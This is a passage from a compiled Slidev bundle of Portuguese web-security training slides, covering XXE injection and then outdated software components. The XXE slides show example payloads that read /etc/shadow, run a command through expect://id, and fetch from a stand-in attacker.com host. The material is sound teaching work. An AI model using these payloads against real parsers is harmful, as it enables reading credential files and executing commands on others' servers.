`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"tipo"),n("span",{style:{color:"#858585"}},">&"),n("span",{style:{color:"#D4976C"}},"tipo"),n("span",{style:{color:"#858585"}},";</"),n("span",{style:{color:"#429988"}},"tipo"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"produto"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"produto"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"nome"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"Celular"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"nome"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"valor"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"752"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"valor"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"    "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"tipo"),n("span",{style:{color:"#858585"}},">&"),n("span",{style:{color:"#D4976C"}},"tipo"),n("span",{style:{color:"#858585"}},";</"),n("span",{style:{color:"#429988"}},"tipo"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"produto"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"produtos"),n("span",{style:{color:"#858585"}},">")])])]),n("pre",{class:"slidev-code shiki shiki-light",style:{"background-color":"#ffffff"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<?"),n("span",{style:{color:"#2F8A89"}},"xml"),n("span",{style:{color:"#B58451"}}," version"),n("span",{style:{color:"#393A34"}},"="),n("span",{style:{color:"#B56959"}},'"1.0"'),n("span",{style:{color:"#B58451"}}," encoding"),n("span",{style:{color:"#393A34"}},"="),n("span",{style:{color:"#B56959"}},'"UTF-8"'),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#8E8F8B"}},"?>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<!"),n("span",{style:{color:"#1C6B48"}},"DOCTYPE"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#A65E2B"}},"produtos"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#8E8F8B"}},"[")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<!"),n("span",{style:{color:"#1C6B48"}},"ENTITY"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#A65E2B"}},"tipo"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#B56959"}},'"Eletr\xF4nicos"'),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"]>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"produtos"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"produto"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"nome"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"Televis\xE3o"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"nome"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"valor"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"850.50"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"valor"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},">&"),n("span",{style:{color:"#A65E2B"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},";</"),n("span",{style:{color:"#2F8A89"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"produto"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"produto"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"nome"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"Celular"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"nome"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"valor"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"752"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"valor"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"    "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},">&"),n("span",{style:{color:"#A65E2B"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},";</"),n("span",{style:{color:"#2F8A89"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"produto"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"produtos"),n("span",{style:{color:"#8E8F8B"}},">")])])])],-1),Ix={__name:"31",setup(e){const t={srcSequence:"./slides/45.xxe.md"};return N(U),(s,o)=>{const r=gs,l=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[Sx,n("div",kx,[W((_(),$("div",Cx,[$x,C(r,Qe({},{ranges:[""]}),{default:X(()=>[Dx]),_:1},16)])),[[l]]),W((_(),$("div",Bx,[Fx,C(r,Qe({},{ranges:[""]}),{default:X(()=>[Ox]),_:1},16)])),[[l]])])]),_:1},16)}}},Tx=n("h1",null,"XXE Injection",-1),Px={grid:"~ cols-2 gap-4"},Mx={style:{transition:"500ms"}},Lx=y(" Leitura de arquivo "),Rx=n("pre",{class:"shiki-container"},[n("pre",{class:"slidev-code shiki shiki-dark",style:{"background-color":"#121212"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<?"),n("span",{style:{color:"#429988"}},"xml"),n("span",{style:{color:"#E0A569"}}," version"),n("span",{style:{color:"#DBD7CA"}},"="),n("span",{style:{color:"#C98A7D"}},'"1.0"'),n("span",{style:{color:"#E0A569"}}," encoding"),n("span",{style:{color:"#DBD7CA"}},"="),n("span",{style:{color:"#C98A7D"}},'"UTF-8"'),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#858585"}},"?>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<!"),n("span",{style:{color:"#4D9375"}},"DOCTYPE"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#D4976C"}},"doc"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#858585"}},"["),n("span",{style:{color:"#DBD7CA"}},"<!ELEMENT doc ANY >")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<!"),n("span",{style:{color:"#4D9375"}},"ENTITY"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#D4976C"}},"tipo"),n("span",{style:{color:"#4D9375"}}," SYSTEM "),n("span",{style:{color:"#C98A7D"}},'"file:///etc/shadow"'),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#858585"}},">]>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"produto"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"nome"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"Celular"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"nome"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"valor"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"752"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"valor"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"tipo"),n("span",{style:{color:"#858585"}},">&"),n("span",{style:{color:"#D4976C"}},"tipo"),n("span",{style:{color:"#858585"}},";</"),n("span",{style:{color:"#429988"}},"tipo"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"produto"),n("span",{style:{color:"#858585"}},">")])])]),n("pre",{class:"slidev-code shiki shiki-light",style:{"background-color":"#ffffff"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<?"),n("span",{style:{color:"#2F8A89"}},"xml"),n("span",{style:{color:"#B58451"}}," version"),n("span",{style:{color:"#393A34"}},"="),n("span",{style:{color:"#B56959"}},'"1.0"'),n("span",{style:{color:"#B58451"}}," encoding"),n("span",{style:{color:"#393A34"}},"="),n("span",{style:{color:"#B56959"}},'"UTF-8"'),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#8E8F8B"}},"?>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<!"),n("span",{style:{color:"#1C6B48"}},"DOCTYPE"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#A65E2B"}},"doc"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#8E8F8B"}},"["),n("span",{style:{color:"#393A34"}},"<!ELEMENT doc ANY >")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<!"),n("span",{style:{color:"#1C6B48"}},"ENTITY"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#A65E2B"}},"tipo"),n("span",{style:{color:"#1C6B48"}}," SYSTEM "),n("span",{style:{color:"#B56959"}},'"file:///etc/shadow"'),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#8E8F8B"}},">]>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"produto"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"nome"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"Celular"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"nome"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"valor"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"752"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"valor"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},">&"),n("span",{style:{color:"#A65E2B"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},";</"),n("span",{style:{color:"#2F8A89"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"produto"),n("span",{style:{color:"#8E8F8B"}},">")])])])],-1),Nx={style:{transition:"500ms"}},qx=y(" Execu\xE7\xE3o de comandos (RCE) "),jx=n("pre",{class:"shiki-container"},[n("pre",{class:"slidev-code shiki shiki-dark",style:{"background-color":"#121212"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<?"),n("span",{style:{color:"#429988"}},"xml"),n("span",{style:{color:"#E0A569"}}," version"),n("span",{style:{color:"#DBD7CA"}},"="),n("span",{style:{color:"#C98A7D"}},'"1.0"'),n("span",{style:{color:"#E0A569"}}," encoding"),n("span",{style:{color:"#DBD7CA"}},"="),n("span",{style:{color:"#C98A7D"}},'"UTF-8"'),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#858585"}},"?>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<!"),n("span",{style:{color:"#4D9375"}},"DOCTYPE"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#D4976C"}},"foo"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#858585"}},"["),n("span",{style:{color:"#DBD7CA"}},"<!ELEMENT foo ANY >")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"   "),n("span",{style:{color:"#858585"}},"<!"),n("span",{style:{color:"#4D9375"}},"ENTITY"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#D4976C"}},"tipo"),n("span",{style:{color:"#4D9375"}}," SYSTEM "),n("span",{style:{color:"#C98A7D"}},'"expect://id"'),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#858585"}},">]>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"produto"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"nome"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"Celular"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"nome"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"valor"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"752"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"valor"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"tipo"),n("span",{style:{color:"#858585"}},">&"),n("span",{style:{color:"#D4976C"}},"tipo"),n("span",{style:{color:"#858585"}},";</"),n("span",{style:{color:"#429988"}},"tipo"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"produto"),n("span",{style:{color:"#858585"}},">")])])]),n("pre",{class:"slidev-code shiki shiki-light",style:{"background-color":"#ffffff"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<?"),n("span",{style:{color:"#2F8A89"}},"xml"),n("span",{style:{color:"#B58451"}}," version"),n("span",{style:{color:"#393A34"}},"="),n("span",{style:{color:"#B56959"}},'"1.0"'),n("span",{style:{color:"#B58451"}}," encoding"),n("span",{style:{color:"#393A34"}},"="),n("span",{style:{color:"#B56959"}},'"UTF-8"'),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#8E8F8B"}},"?>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<!"),n("span",{style:{color:"#1C6B48"}},"DOCTYPE"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#A65E2B"}},"foo"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#8E8F8B"}},"["),n("span",{style:{color:"#393A34"}},"<!ELEMENT foo ANY >")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"   "),n("span",{style:{color:"#8E8F8B"}},"<!"),n("span",{style:{color:"#1C6B48"}},"ENTITY"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#A65E2B"}},"tipo"),n("span",{style:{color:"#1C6B48"}}," SYSTEM "),n("span",{style:{color:"#B56959"}},'"expect://id"'),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#8E8F8B"}},">]>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"produto"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"nome"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"Celular"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"nome"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"valor"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"752"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"valor"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},">&"),n("span",{style:{color:"#A65E2B"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},";</"),n("span",{style:{color:"#2F8A89"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"produto"),n("span",{style:{color:"#8E8F8B"}},">")])])])],-1),Hx={style:{transition:"500ms"}},zx=n("p",null,"Requisi\xE7\xE3o (SSRF)",-1),Vx=n("pre",{class:"shiki-container"},[n("pre",{class:"slidev-code shiki shiki-dark",style:{"background-color":"#121212"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<?"),n("span",{style:{color:"#429988"}},"xml"),n("span",{style:{color:"#E0A569"}}," version"),n("span",{style:{color:"#DBD7CA"}},"="),n("span",{style:{color:"#C98A7D"}},'"1.0"'),n("span",{style:{color:"#E0A569"}}," encoding"),n("span",{style:{color:"#DBD7CA"}},"="),n("span",{style:{color:"#C98A7D"}},'"UTF-8"'),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#858585"}},"?>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<!"),n("span",{style:{color:"#4D9375"}},"DOCTYPE"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#D4976C"}},"foo"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#858585"}},"["),n("span",{style:{color:"#DBD7CA"}},"<!ELEMENT foo ANY >")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<!"),n("span",{style:{color:"#4D9375"}},"ENTITY"),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#D4976C"}},"tipo"),n("span",{style:{color:"#4D9375"}}," SYSTEM "),n("span",{style:{color:"#C98A7D"}},'"http://www.attacker.com/malware.exe"'),n("span",{style:{color:"#DBD7CA"}}," "),n("span",{style:{color:"#858585"}},">]>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"produto"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"nome"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"Celular"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"nome"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"valor"),n("span",{style:{color:"#858585"}},">"),n("span",{style:{color:"#DBD7CA"}},"752"),n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"valor"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#DBD7CA"}},"  "),n("span",{style:{color:"#858585"}},"<"),n("span",{style:{color:"#429988"}},"tipo"),n("span",{style:{color:"#858585"}},">&"),n("span",{style:{color:"#D4976C"}},"tipo"),n("span",{style:{color:"#858585"}},";</"),n("span",{style:{color:"#429988"}},"tipo"),n("span",{style:{color:"#858585"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"</"),n("span",{style:{color:"#429988"}},"produto"),n("span",{style:{color:"#858585"}},">")])])]),n("pre",{class:"slidev-code shiki shiki-light",style:{"background-color":"#ffffff"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<?"),n("span",{style:{color:"#2F8A89"}},"xml"),n("span",{style:{color:"#B58451"}}," version"),n("span",{style:{color:"#393A34"}},"="),n("span",{style:{color:"#B56959"}},'"1.0"'),n("span",{style:{color:"#B58451"}}," encoding"),n("span",{style:{color:"#393A34"}},"="),n("span",{style:{color:"#B56959"}},'"UTF-8"'),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#8E8F8B"}},"?>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<!"),n("span",{style:{color:"#1C6B48"}},"DOCTYPE"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#A65E2B"}},"foo"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#8E8F8B"}},"["),n("span",{style:{color:"#393A34"}},"<!ELEMENT foo ANY >")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<!"),n("span",{style:{color:"#1C6B48"}},"ENTITY"),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#A65E2B"}},"tipo"),n("span",{style:{color:"#1C6B48"}}," SYSTEM "),n("span",{style:{color:"#B56959"}},'"http://www.attacker.com/malware.exe"'),n("span",{style:{color:"#393A34"}}," "),n("span",{style:{color:"#8E8F8B"}},">]>")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"produto"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"nome"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"Celular"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"nome"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"valor"),n("span",{style:{color:"#8E8F8B"}},">"),n("span",{style:{color:"#393A34"}},"752"),n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"valor"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#393A34"}},"  "),n("span",{style:{color:"#8E8F8B"}},"<"),n("span",{style:{color:"#2F8A89"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},">&"),n("span",{style:{color:"#A65E2B"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},";</"),n("span",{style:{color:"#2F8A89"}},"tipo"),n("span",{style:{color:"#8E8F8B"}},">")]),y(`
`),n("span",{class:"line"},[n("span",{style:{color:"#8E8F8B"}},"</"),n("span",{style:{color:"#2F8A89"}},"produto"),n("span",{style:{color:"#8E8F8B"}},">")])])])],-1),Ux={__name:"32",setup(e){const t={srcSequence:"./slides/46.xxe-injection.md"};return N(U),(s,o)=>{const r=gs,l=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[Tx,n("div",Px,[W((_(),$("div",Mx,[Lx,C(r,Qe({},{ranges:[""]}),{default:X(()=>[Rx]),_:1},16)])),[[l]]),W((_(),$("div",Nx,[qx,C(r,Qe({},{ranges:[""]}),{default:X(()=>[jx]),_:1},16)])),[[l]])]),W((_(),$("div",Hx,[zx,C(r,Qe({},{ranges:[""]}),{default:X(()=>[Vx]),_:1},16)])),[[l]])]),_:1},16)}}},Wx=n("h1",null,"Componentes desatualizados e vulner\xE1veis",-1),Yx={__name:"33",setup(e){const t={layout:"center",class:"text-center",srcSequence:"./slides/50.components.md"};return N(U),(s,o)=>(_(),Y(gn,pe(de(t)),{default:X(()=>[Wx]),_:1},16))}},Kx=n("h1",null,"O que s\xE3o componentes de software?",-1),Xx=n("h4",null,"S\xE3o peda\xE7os pr\xE9-desenvolvidos de c\xF3digo utilizados na composi\xE7\xE3o de um software. S\xE3o tamb\xE9m chamados de biblioteca, framework, depend\xEAncia, pacote etc\u2026",-1),Qx=n("br",null,null,-1),Zx=n("br",null,null,-1),Gx={style:{transition:"500ms"},grid:"~ cols-4 gap-4"},Jx=n("br",null,null,-1),e3={style:{transition:"500ms"},grid:"~ cols-4 gap-4"},t3={__name:"34",setup(e){const t={srcSequence:"./slides/51.components.md"};return N(U),(s,o)=>{const r=Ne,l=He("click");return _(),Y(Ce,pe(de(t)),{default:X(()=>[Kx,Xx,Qx,Zx,W((_(),$("div",Gx,[n("div",null,[C(r,{src:"react-logo.png",width:"100"})]),n("div",null,[C(r,{src:"angular-logo.png",width:"100"})]),n("div",null,[C(r,{src:"vue-logo.png",width:"100"})]),n("div",null,[C(r,{src:"jquery-logo.png",width:"100"})])])),[[l]]),Jx,W((_(),$("div",e3,[n("div",null,[C(r,{src:"spring-boot-logo.png",width:"100"})]),n("div",null,[C(r,{src:"dotnet-logo.png",width:"100"})]),n("div",null,[C(r,{src:"laravel-logo.png",width:"100"})]),n("div",null,[C(r,{src:"django-logo.png",width:"100"})])])),[[l]])]),_:1},16)}}},n3=n("h1",null,"Exemplos de depend\xEAncias",-1),s3={grid:"~ cols-2 gap-4"},o3=n("br",null,null,-1),r3=n("span",{style:{color:"#009900"}},"package.json",-1),l3=n("pre",{class:"shiki-container"},[n("pre",{class:"slidev-code shiki shiki-dark",style:{"background-color":"#121212"}},[n("code",null,[n("span",{class:"line"},[n("span",{style:{color:"#858585"}},"{")]),y(`
